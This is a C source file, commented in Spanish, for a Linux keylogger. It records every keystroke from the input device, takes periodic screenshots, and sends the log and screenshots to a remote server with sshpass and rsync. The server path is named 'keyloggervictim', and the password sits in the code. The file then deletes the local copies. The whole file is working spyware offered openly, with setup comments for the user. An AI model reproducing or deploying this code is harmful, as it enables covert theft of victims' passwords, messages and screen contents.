//Librerias necesarias
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <ctype.h>
#include <time.h>

//VARIABLES IMPORTANTES
#define LOGFILEPATH "/home/edsonsm/Desktop/scripts/keylogger.txt" //MODIFICAR ESTA LINEA DEPENDIENDO DEL ORDEN EN TU SISTEMA OPERATIVO
#define SCREENSHOT_DIR "/home/edsonsm/Desktop/screenshots/" //MODIFICAR ESTA LINEA DE ACUERDO A DONDE QUIERES 
#define SCREENSHOT_PATH "screenshot_%Y-%m-%d_%H-%M-%S.png"
#define RSYNC_PASSWORD "11222619M" //PASSWORD DEL SERVIDOR PARA ENVIAR SCREENSHOTS Y KEYLOGGER.TXT
#define RSYNC_USER "emayorga" //USUARIO DEL SERVIDOR PARA ENVIAR SCREENSHOTS Y KEYLOGGER.TXT
#define RSYNC_HOST "172.16.1.25" //IP DEL SERVIDOR
#define RSYNC_LOG_PATH "/tmp/keyloggervictim/keylogger.txt" //RUTA DEL SERVIDOR DONDE SE ENVIARÁ EL KEYLOGGER.TXT
#define RSYNC_SCREENSHOTS_PATH "/tmp/keyloggervictim/screenshots/" //RUTA DE LA CARPETA EN SERVIDOR DONDE SE ENVIARAN SCREENSHOTS

// Funciones a utilizar
char *getEvent();
void updateModifierStates(int keycode, int value, int *shift, int *altGr, int *capsLock);
void takeScreenshot();
void syncFiles();

//FUNCION PRINCIPAL (AQUI INICIA EL PROGRAMA)
int main() {
    struct input_event ev;
    static char path_keyboard[20] = "/dev/input/";
    strcat(path_keyboard, getEvent());
    path_keyboard[strlen(path_keyboard) - 1] = 0;

    int device_keyboard = open(path_keyboard, O_RDONLY);
    if (device_keyboard == -1) {
        perror("Error opening device");
        exit(EXIT_FAILURE);
    }

    FILE *fp = fopen(LOGFILEPATH, "a");
    if (fp == NULL) {
        perror("Error opening log file");
        close(device_keyboard);
        exit(EXIT_FAILURE);
    }

    int shift = 0;
    int altGr = 0;
    int capsLock = 0;

    // Crear directorio para capturas de pantalla si no existe
    struct stat st = {0};
    if (stat(SCREENSHOT_DIR, &st) == -1) {
        if (mkdir(SCREENSHOT_DIR, 0700) != 0) {
            perror("Error creating screenshot directory");
            close(device_keyboard);
            fclose(fp);
            exit(EXIT_FAILURE);
        }
    }

    time_t last_screenshot_time = time(NULL);
    time_t last_sync_time = time(NULL);

    while (1) {
        ssize_t bytesRead = read(device_keyboard, &ev, sizeof(ev));
        if (bytesRead < 0) {
            perror("Error reading from device");
            break;
        }

        // Captura de pantalla cada minuto (MODIFICA EL VALOR 60.0 DEPENDIENDO DE QUE TANTO TIEMPO QUIERES ENTRE CAPTURAS)
        time_t current_time = time(NULL);
        if (difftime(current_time, last_screenshot_time) >= 60.0) {
            takeScreenshot();
            last_screenshot_time = current_time;
        }

        // Sincronizar archivos cada 5 minutos (MODIFICA EL VALOR 300.0 DEPENDIENDO DE QUE TANTA FRECUENCIA NECESITES PARA ENVIAR LOS ARCHIVOS)
        if (difftime(current_time, last_sync_time) >= 300.0) {
            syncFiles();
            last_sync_time = current_time;
        }

        if (ev.type == EV_KEY) {
            updateModifierStates(ev.code, ev.value, &shift, &altGr, &capsLock);
            if (ev.value == 0) {
                char key = '\0';

                // MAPEANDO TECLAS SEGUN EL CASO QUE DEVUELVA ev
                switch (ev.code) {
                    case KEY_A: key = 'a'; break;
                    case KEY_B: key = 'b'; break;
                    case KEY_C: key = 'c'; break;
                    case KEY_D: key = 'd'; break;
                    case KEY_E: key = 'e'; break;
                    case KEY_F: key = 'f'; break;
                    case KEY_G: key = 'g'; break;
                    case KEY_H: key = 'h'; break;
                    case KEY_I: key = 'i'; break;
                    case KEY_J: key = 'j'; break;
                    case KEY_K: key = 'k'; break;
                    case KEY_L: key = 'l'; break;
                    case KEY_M: key = 'm'; break;
                    case KEY_N: key = 'n'; break;
                    case KEY_O: key = 'o'; break;
                    case KEY_P: key = 'p'; break;
                    case KEY_Q: key = 'q'; break;
                    case KEY_R: key = 'r'; break;
                    case KEY_S: key = 's'; break;
                    case KEY_T: key = 't'; break;
                    case KEY_U: key = 'u'; break;
                    case KEY_V: key = 'v'; break;
                    case KEY_W: key = 'w'; break;
                    case KEY_X: key = 'x'; break;
                    case KEY_Y: key = 'y'; break;
                    case KEY_Z: key = 'z'; break;
                    case KEY_1: key = '1'; break;
                    case KEY_2: key = '2'; break;
                    case KEY_3: key = '3'; break;
                    case KEY_4: key = '4'; break;
                    case KEY_5: key = '5'; break;
                    case KEY_6: key = '6'; break;
                    case KEY_7: key = '7'; break;
                    case KEY_8: key = '8'; break;
                    case KEY_9: key = '9'; break;
                    case KEY_0: key = '0'; break;
                    case KEY_SPACE: key = ' '; break;
                    case KEY_ENTER: key = '\n'; break;
                    case KEY_BACKSPACE: key = '\b'; break;
                    case KEY_MINUS: key = '-'; break;
                    case KEY_EQUAL: key = '='; break;
                    case KEY_LEFTBRACE: key = '['; break;
                    case KEY_RIGHTBRACE: key = ']'; break;
                    case KEY_BACKSLASH: key = '\\'; break;
                    case KEY_SEMICOLON: key = ';'; break;
                    case KEY_APOSTROPHE: key = '\''; break;
                    case KEY_GRAVE: key = '`'; break;
                    case KEY_COMMA: key = ','; break;
                    case KEY_DOT: key = '.'; break;
                    case KEY_SLASH: key = '/'; break;
                    default: key = '\0'; break;
                }

                // PARA: Shift
                if (shift) {
                    if (key >= 'a' && key <= 'z') key = key - 'a' + 'A';
                    switch (ev.code) {
                        case KEY_1: key = '!'; break;
                        case KEY_2: key = '"'; break;
                        case KEY_3: key = '#'; break;
                        case KEY_4: key = '$'; break;
                        case KEY_5: key = '%'; break;
                        case KEY_6: key = '^'; break;
                        case KEY_7: key = '&'; break;
                        case KEY_8: key = '*'; break;
                        case KEY_9: key = '('; break;
                        case KEY_0: key = ')'; break;
                        case KEY_MINUS: key = '_'; break;
                        case KEY_EQUAL: key = '+'; break;
                        case KEY_LEFTBRACE: key = '{'; break;
                        case KEY_RIGHTBRACE: key = '}'; break;
                        case KEY_BACKSLASH: key = '|'; break;
                        case KEY_SEMICOLON: key = ':'; break;
                        case KEY_APOSTROPHE: key = '"'; break;
                        case KEY_GRAVE: key = '~'; break;
                        case KEY_COMMA: key = '<'; break;
                        case KEY_DOT: key = '>'; break;
                        case KEY_SLASH: key = '?'; break;
                    }
                }

                // PARA: AltGr
                if (altGr) {
                    switch (ev.code) {
                        case KEY_Q: key = '@'; break;
                        // AÑADE MAS CASOS SEGUN EL TECLADO QUE ESTES USANDO
                    }
                }

                // PARA: MAYUSCULAS
                if (capsLock && key >= 'a' && key <= 'z') key = key - 'a' + 'A';

                // Output the character
                if (key != '\0') {
                    if (key == '\b') {
                        fseek(fp, -1, SEEK_CUR);
                        fprintf(fp, " ");
                        fseek(fp, -1, SEEK_CUR);
                    } else {
                        fprintf(fp, "%c", key);
                    }
                    fflush(fp);
                }
            }
        }
    }

    close(device_keyboard);
    fclose(fp);
    return 0;
}

//FUNCION PARA OBTENER EL EVENTO DEL TECLADO
char *getEvent() {
    char *command = (char *) "cat /proc/bus/input/devices | grep -C 5 Keyboard | grep -E -o 'event[0-9]'"; //MODIFICA ESTE COMANDO SEGUN LA CONFIGURACION DE TU SISTEMA OPERATIVO
    static char event[8];
    FILE *pipe = popen(command, "r");
    if (!pipe)
        exit(1);
    fgets(event, 8, pipe);
    pclose(pipe);
    return event;
}
//FUNCION PARA DETECTAR SHIFT, ALTGR Y MAYUSCULAS
void updateModifierStates(int keycode, int value, int *shift, int *altGr, int *capsLock) {
    if (keycode == KEY_LEFTSHIFT || keycode == KEY_RIGHTSHIFT) {
        *shift = value;
    } else if (keycode == KEY_RIGHTALT) {
        *altGr = value;
    } else if (keycode == KEY_CAPSLOCK && value == 0) {
        *capsLock = !(*capsLock);
    }
}
//FUNCION PARA TOMAR CAPTURAS DE PANTALLA
void takeScreenshot() {
    char screenshot_filename[256];
    char touch_command[256];
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    strftime(screenshot_filename, sizeof(screenshot_filename), SCREENSHOT_PATH, tm_info);
    snprintf(touch_command, sizeof(touch_command), "touch %s%s", SCREENSHOT_DIR, screenshot_filename); //PRIMERO CREAMOS EL ARCHIVO DONDE SE VA A GUARDAR LA CAPTURA DE PANTALLA
    printf("Executing command: %s\n", touch_command); // Imprimir comando (ESTA LINEA SOLO FUNCIONA COMO REFERENCIA Y GUIA PARA SABER QUE COMANDO SE EJECUTÓ)
    system(touch_command);

    // Comando para tomar la captura de pantalla
    char screenshot_command[256];
    snprintf(screenshot_command, sizeof(screenshot_command), "import -window root %s%s", SCREENSHOT_DIR, screenshot_filename);
    printf("Executing command: %s\n", screenshot_command); // Imprimir comando (ESTA LINEA SOLO FUNCIONA COMO REFERENCIA Y GUIA PARA SABER QUE COMANDO SE EJECUTÓ)
    system(screenshot_command);
}
//FUNCION PARA ENVIAR ARCHIVOS AL SERVIDOR
void syncFiles() {
    // Sincronizar el archivo de registro keylogger.txt con el servidor
    char rsync_log_command[256];
    snprintf(rsync_log_command, sizeof(rsync_log_command), 
        "sshpass -p %s rsync -avh %s %s@%s:%s", 
        RSYNC_PASSWORD,
        LOGFILEPATH,
        RSYNC_USER,
        RSYNC_HOST,
        RSYNC_LOG_PATH
    );
    printf("Executing command: %s\n", rsync_log_command); // Imprimir comando (ESTA LINEA SOLO FUNCIONA COMO REFERENCIA Y GUIA PARA SABER QUE COMANDO SE EJECUTÓ)
    system(rsync_log_command);

    // Sincronizar capturas de pantalla con el servidor
    char rsync_screenshots_command[256];
    snprintf(rsync_screenshots_command, sizeof(rsync_screenshots_command),
        "sshpass -p %s rsync -avh %s* %s@%s:%s", 
        RSYNC_PASSWORD,
        SCREENSHOT_DIR,
        RSYNC_USER,
        RSYNC_HOST,
        RSYNC_SCREENSHOTS_PATH
    );
    printf("Executing command: %s\n", rsync_screenshots_command); // Imprimir comando (ESTA LINEA SOLO FUNCIONA COMO REFERENCIA Y GUIA PARA SABER QUE COMANDO SE EJECUTÓ)
    system(rsync_screenshots_command);

    // Limpiando el directorio de capturas de pantalla despues de que haya sido enviada al servidor
    char cleanup_screenshots_command[256];
    snprintf(cleanup_screenshots_command, sizeof(cleanup_screenshots_command), 
        "rm -f %s*", 
        SCREENSHOT_DIR
    );
    printf("Executing command: %s\n", cleanup_screenshots_command); // Imprimir comando (ESTA LINEA SOLO FUNCIONA COMO REFERENCIA Y GUIA PARA SABER QUE COMANDO SE EJECUTÓ)
    system(cleanup_screenshots_command);

    // Vaciar el archivo de registro keylogger.txt despues de que haya sido enviado al servidor
    char clear_logfile_command[256];
    snprintf(clear_logfile_command, sizeof(clear_logfile_command), 
        "truncate -s 0 %s", 
        LOGFILEPATH
    );
    printf("Executing command: %s\n", clear_logfile_command); // Imprimir comando (ESTA LINEA SOLO FUNCIONA COMO REFERENCIA Y GUIA PARA SABER QUE COMANDO SE EJECUTÓ)
    system(clear_logfile_command);
}